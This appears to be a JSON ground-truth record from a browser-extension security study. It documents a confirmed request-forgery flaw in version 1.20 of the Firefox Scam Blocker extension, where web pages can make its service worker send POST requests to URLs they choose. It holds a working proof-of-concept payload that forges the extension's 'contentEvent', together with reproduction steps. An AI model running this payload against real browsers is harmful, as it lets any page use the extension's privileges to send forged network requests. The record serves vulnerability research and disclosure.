@@ -1,0 +1,307 @@
+{
+  "schema_version": "expguard-ground-truth-flows/v1",
+  "platform": "firefox",
+  "extension_id": "scamblocker_extensiondevelopers@pcmatic.com",
+  "version": "1.20",
+  "flows": [
+    {
+      "ground_truth_flow_id": "gtf-2b4c53cd99ee2474",
+      "verification": "TP",
+      "source_family": "custom",
+      "sink_family": "FETCH_RESOURCE",
+      "matched_tools": [
+        "ExPGuard"
+      ],
+      "match_region": "ExPGuard only",
+      "match_basis": "single_tool_report",
+      "reports": [
+        {
+          "tool": "ExPGuard-Opti",
+          "tool_label": "ExPGuard",
+          "source_report": "ExPGuard-Opti/firefox/flow-verification-results-no-duplicate.json",
+          "flow_id": "expguard-opti:firefox:scamblocker_extensiondevelopers@pcmatic.com:1.20:fad3bbaabaa51d2a:01",
+          "flow": {
+            "flow_id": "expguard-opti:firefox:scamblocker_extensiondevelopers@pcmatic.com:1.20:fad3bbaabaa51d2a:01",
+            "flow_index": 0,
+            "flow_order": 1,
+            "flow_label": "F001",
+            "semantic_sha256": "fad3bbaabaa51d2a328179fdc809e004ef87a38383fe3473d0c114cae44fa542",
+            "semantic_key": {
+              "rule_id": "attacker-input-network-send",
+              "flow_type": "REQUEST_FORGERY",
+              "source_type": "TARGET_CUSTOM_EVENT",
+              "source_file": "override",
+              "source_loc": "1851817",
+              "source_frame": "CS_1",
+              "sink_type": "FETCH_RESOURCE",
+              "sink_file": "service-worker",
+              "sink_loc": "20312611",
+              "sink_frame": "BG_1"
+            },
+            "identity_occurrence": 1,
+            "source_report_id": 1,
+            "flow_type": "REQUEST_FORGERY",
+            "rule_id": "attacker-input-network-send",
+            "rule_description": "Attacker-controlled data flowing into outbound network requests — request-forgery / SSRF surface.",
+            "severity": "CRITICAL",
+            "severity_reason": "Wildcard host `*` allows coverage of arbitrary domains.",
+            "severity_evidence": [
+              "http://*/*"
+            ],
+            "source": {
+              "type": "TARGET_CUSTOM_EVENT",
+              "remark": "target.addEventListener(contentEvent)",
+              "file": "override",
+              "loc": "L18:C5 -> L18:C17",
+              "frame": "CS_1",
+              "frames": [
+                {
+                  "id": "CS_1",
+                  "family": "CS",
+                  "constraint": {
+                    "matches": [
+                      "http://*/*",
+                      "https://*/*"
+                    ]
+                  }
+                }
+              ],
+              "provenance": "CONTENT_SCRIPT",
+              "origin_context": "override",
+              "origin_frame_family": "CS",
+              "constraint": {
+                "matches": [
+                  "http://*/*",
+                  "https://*/*"
+                ]
+              },
+              "code_preview": "nse(message);\n      >>> } catch(err<<<or) {\n        messag"
+            },
+            "sink": {
+              "type": "FETCH_RESOURCE",
+              "remark": "[Unknown URL]",
+              "file": "service-worker",
+              "loc": "L20:C31 -> L26:C11",
+              "frame": "BG_1",
+              "frames": [
+                {
+                  "id": "BG_1",
+                  "family": "BG"
+                }
+              ],
+              "url_taint_control": "FULL",
+              "code_preview": "st response = await >>>fetch(message.url, {\n         method: 'POST',\n         headers: {\n          'Content-Type': 'application/x-www-form-urlencoded',\n        },\n        body: body\n         })<<<;\n         const dat"
+            },
+            "structural": {
+              "constraint_kind": "CONTENT_SCRIPT_MATCHES",
+              "privilege_crossing": true,
+              "privilege_reason": "sink grants capability beyond the source origin",
+              "message_passing": true,
+              "storage_passing": false,
+              "message_sender": "override",
+              "message_sender_provenance": "CONTENT_SCRIPT",
+              "channel": "runtime.single.sender.message[override->service-worker]",
+              "storage_area": null
+            },
+            "verification": "TP",
+            "dynamic": true,
+            "duplicate_of": null,
+            "is_duplicate": false,
+            "duplicate_kind": null,
+            "duplicate_reason": null,
+            "verification_source": [
+              "Manual"
+            ],
+            "verification_evidence": {
+              "true_positive": [
+                {
+                  "tier": "user_manual_validation",
+                  "source": "Manual/Source Analysis",
+                  "kind": "user_manual_validation",
+                  "verdict": "TP",
+                  "confidence": 0.95,
+                  "detail": "用户人工验证确认该 Flow 可达并产生对应特权效果。"
+                }
+              ],
+              "false_positive": []
+            },
+            "verification_conflict": false,
+            "verification_resolution": "manual_override",
+            "static": {
+              "verdict": "TRUE_POSITIVE",
+              "confidence": 0.6,
+              "report_disposition": "SUMMARY",
+              "representative_index": null,
+              "source_report_id": 1,
+              "source_provenance": "CONTENT_SCRIPT",
+              "reasoning": "Structured extraction unavailable; explicit analyst conclusion preserved from the final static transcript: ## Flow Verification: REQUEST_FORGERY (content script → background `fetch`)\n\n### 1. Source control (attacker-controllable?)\n\n**Yes.** `override.js` is a content script registered on `http://*/*` and `https://*/*` (manifest `content_scripts.matches`). It registers:\n\n```js\ndocument.addEventListener(\"contentEvent\", async function(event) {\n  ...\n  if (event.detail.type == 'serviceworker') {      // L18, harness snippet\n    const result = await brow.runtime.sendMessage(event.detail);  // L20\n```\n\nThe source is a **DOM `CustomEvent` (\"contentEvent\")** whose `event.detail` is fully supplied by the page. There is no `event.source`/origin check, no token, and no fixed sender. Any script running on a matched page can dispatch:\n\n```js\ndocument.dispatchEvent(new CustomEvent('contentEvent', {detail: {...}}));\n```\n\nThe harness explicitly confirms this bridge class: *\"A page can forge window.postMessage/CustomEvent fields… event.source === window, same-page origin checks, and message action/type fields are not authentication.\"*\n\n### 2. Source-to-sink path (unbroken?)\n\n**Yes, fully connected:**\n\n1. Page dispatches `contentEvent` with `detail.type === 'serviceworker'` (L18 guard is attacker-satisfi",
+              "dynamic_guidance": {
+                "triggerable": false,
+                "trigger_mechanism": "OTHER",
+                "injection_context": "",
+                "origin_requirement": "",
+                "trigger_surface": "",
+                "target_urls": [],
+                "payload_sketch": "",
+                "dom_forgery": "",
+                "beacon_pointable": false,
+                "beacon_param": "",
+                "observation": "",
+                "notes": ""
+              },
+              "path": "extensions/scamblocker_extensiondevelopers@pcmatic.com_1.20/static/static_report.json",
+              "report_mtime": "2026-08-14T03:29:21.367Z"
+            },
+            "dynamic_detail": {
+              "outcome": "INCONCLUSIVE_AFTER_DEBUG",
+              "final_verdict": "UNCERTAIN",
+              "recorded_label": null,
+              "confidence": 0,
+              "reproduced": false,
+              "basis": null,
+              "usable_for_label": false,
+              "evidence_stage": null,
+              "evidence_artifact_count": 0,
+              "reasoning": "ReAct LLM phase exceeded its 30s budget (thinking-mode latency); deterministic evidence retained and graded inconclusive rather than guessed.",
+              "evidence": "deep-trace=source-contract={\"surface\": \"CUSTOM_EVENT\", \"sourcePath\": \"override.js\", \"location\": \"L18:C5 -> L18:C17\", \"eventNames\": [\"contentEvent\"], \"eventTarget\": \"document\", \"eventDetailKey\": \"detail\", \"envelope\": {}, \"forwardField\": \"\", \"requirements\": {\"type\": \"serviceworker\", \"callingFunc\": \"getStorage\"}, \"selectors\": [], \"mediaTags\": [], \"snippet\": \"var s = document.createElement('script');\\ns.src = chrome.runtime.getURL('scam-block.js');\\n(document.head || document.documentElement).appendChild(s);\\n\\nconst scameblockerelement_whitelist = document.createElement(\\\"tag\\\");\\nscameblockerelement_whitelist.setAttribute(\\\"id\\\", \\\"scamblocker-whitelist\\\");\\n(document.head || document.documentElement).appendChild(scameblockerelement_whitelist)\\n\\nconst scameblockerelement_ismalicious = document.createElement(\\\"tag\\\");\\nscameblockerelement_ismalicious.setAttribute(\\\"id\\\", \\\"scamblocker-ismalicious\\\");",
+              "path": "extensions/scamblocker_extensiondevelopers@pcmatic.com_1.20/dynamic/dynamic_report.json",
+              "report_mtime": "2026-08-17T10:01:23.956Z"
+            },
+            "dynamic_run_evidence": null,
+            "expagent_final": {
+              "verdict": "TP",
+              "label": "TP",
+              "confidence": 0.6,
+              "reasoning": "Completed static source-level TP evidence is retained; dynamic result is not a rebuttal.",
+              "evidence_summary": "Completed static source-level TP evidence is retained; dynamic result is not a rebuttal.",
+              "conflict_resolution": "Strict final decision table applied.",
+              "static_verdict_snapshot": "TRUE_POSITIVE",
+              "dynamic_outcome_snapshot": "INCONCLUSIVE_AFTER_DEBUG",
+              "tool_reports_consulted": [
+                "primary"
+              ],
+              "trust": "static_supported",
+              "usable_for_label": true,
+              "path": "../../../ExPGuard-Ablation/Consolidated-Extension-Security-Analysis/tools/ExPGuard-Opti/firefox/extensions/scamblocker_extensiondevelopers@pcmatic.com_1.20/final-verified-v2/final_report.json",
+              "report_mtime": "2026-08-20T13:34:25.755Z"
+            },
+            "manual_validation": {
+              "selected": true,
+              "status": "confirmed_tp",
+              "verdict": "TP",
+              "confidence": 0.95,
+              "operator": "user/source-based manual validation",
+              "validated_at_utc": "2026-09-23T03:52:31.503172Z",
+              "vulnerability_summary": "document CustomEvent contentEvent 的 detail 经 runtime message 原样到达 service worker，service worker 对 detail.url 执行 POST fetch。",
+              "target_sites": [
+                "任意 http://*/* 或 https://*/* 页面"
+              ],
+              "preconditions": [
+                "临时加载 scamblocker 的 unpacked 目录。",
+                "启动一个本地 HTTP 测试服务器，记录请求并返回 JSON，例如 http://127.0.0.1:8765/。"
+              ],
+              "payloads": [
+                {
+                  "surface": "page_console",
+                  "language": "javascript",
+                  "purpose": "伪造 Scam Blocker 内部事件，触发后台 POST fetch。",
+                  "code": "document.dispatchEvent(new CustomEvent(\"contentEvent\", {\n  detail: {\n    type: \"serviceworker\",\n    callingFunc: \"isMalicious\",\n    url: \"http://127.0.0.1:8765/expguard\",\n    form: { marker: \"EXPAGENT_SCAMBLOCKER\" }\n  }\n}));"
+                }
+              ],
+              "steps": [
+                {
+                  "step": 1,
+                  "action": "启动本地服务器",
+                  "detail": "监听 127.0.0.1:8765，返回 Content-Type: application/json 和 {\"ok\":true}，若浏览器执行 CORS 检查则同时返回 Access-Control-Allow-Origin: *。",
+                  "expected": "服务器可记录收到的 POST body。"
+                },
+                {
+                  "step": 2,
+                  "action": "打开测试页",
+                  "detail": "打开任意 HTTP(S) 页面，例如 https://example.com/。",
+                  "expected": "Scam Blocker 的 override.js 已注入。"
+                },
+                {
+                  "step": 3,
+                  "action": "发送 payload",
+                  "detail": "在页面 Console 执行 payload。",
+                  "expected": "本地服务器收到 POST /expguard。"
+                },
+                {
+                  "step": 4,
+                  "action": "检查请求内容",
+                  "detail": "查看服务器日志中的 body。",
+                  "expected": "body 为 marker=EXPAGENT_SCAMBLOCKER，Content-Type 为 application/x-www-form-urlencoded。"
+                }
+              ],
+              "expected_effect": "任意页面可通过 DOM 事件指定后台 fetch 的目标 URL 和 POST body，形成页面到特权网络请求的跨界数据流。",
+              "observation_points": [
+                "本地服务器请求日志",
+                "请求 body",
+                "service worker Network/Console"
+              ],
+              "false_positive_checks": [
+                "若只有内容脚本本地处理、没有后台请求，应判未复现。",
+                "若浏览器因 host permission/CORS 阻止请求，需记录为外部前置条件而非自动 FP。"
+              ],
+              "safety_notes": [
+                "URL 仅使用本机回环地址；不要向第三方目标发送请求。"
+              ],
+              "result": {
+                "reproduced": true,
+                "observed_effect": "用户人工验证确认该 Flow 可达并产生对应特权效果。",
+                "evidence_paths": [],
+                "limitations": "The verdict was supplied by the user or derived from the supplied source and vulnerability reports when the user could not decide."
+              },
+              "plan_kind": "curated",
+              "selected_flow_id": "expguard-opti:firefox:scamblocker_extensiondevelopers@pcmatic.com:1.20:fad3bbaabaa51d2a:01",
+              "source_report_path": "D:\\Ph0jav7\\ExtensionSecurity\\ExPGuard-Data\\Top5000\\ExPGuard-Opti\\firefox\\extensions\\scamblocker_extensiondevelopers@pcmatic.com_1.20\\source\\summary.json",
+              "static_report_path": "D:\\Ph0jav7\\ExtensionSecurity\\ExPGuard-Data\\Top5000\\ExPGuard-Opti\\firefox\\extensions\\scamblocker_extensiondevelopers@pcmatic.com_1.20\\static\\static_report.json",
+              "dynamic_report_path": "D:\\Ph0jav7\\ExtensionSecurity\\ExPGuard-Data\\Top5000\\ExPGuard-Opti\\firefox\\extensions\\scamblocker_extensiondevelopers@pcmatic.com_1.20\\dynamic\\dynamic_report.json",
+              "operator_input_template": {
+                "verdict_options": [
+                  "TP",
+                  "FP",
+                  "PARTIAL",
+                  "UNCONFIRMED"
+                ],
+                "result_fields": [
+                  "verdict",
+                  "confidence",
+                  "reproduced",
+                  "observed_effect",
+                  "evidence_paths",
+                  "limitations",
+                  "operator",
+                  "validated_at_utc"
+                ]
+              }
+            },
+            "manual_verification": [
+              {
+                "source": "Manual/Source Analysis",
+                "kind": "user_manual_validation",
+                "verification_origin": "manual_user_and_source_analysis",
+                "verdict": "TP",
+                "confidence": 0.95,
+                "validated_at_utc": "2026-09-23T03:52:31.503172Z",
+                "notes": "用户人工验证确认该 Flow 可达并产生对应特权效果。"
+              }
+            ],
+            "notes": [
+              "Manual verdict applied: TP."
+            ],
+            "snapshot_drift": null,
+            "data_availability": "extensions-dir+flow-summary"
+          }
+        }
+      ],
+      "version_update_assessment": {
+        "status": "version_unchanged",
+        "dataset_version": "1.20",
+        "latest_version": "1.20",
+        "tool_assessments": []
+      }
+    }
+  ]
+}
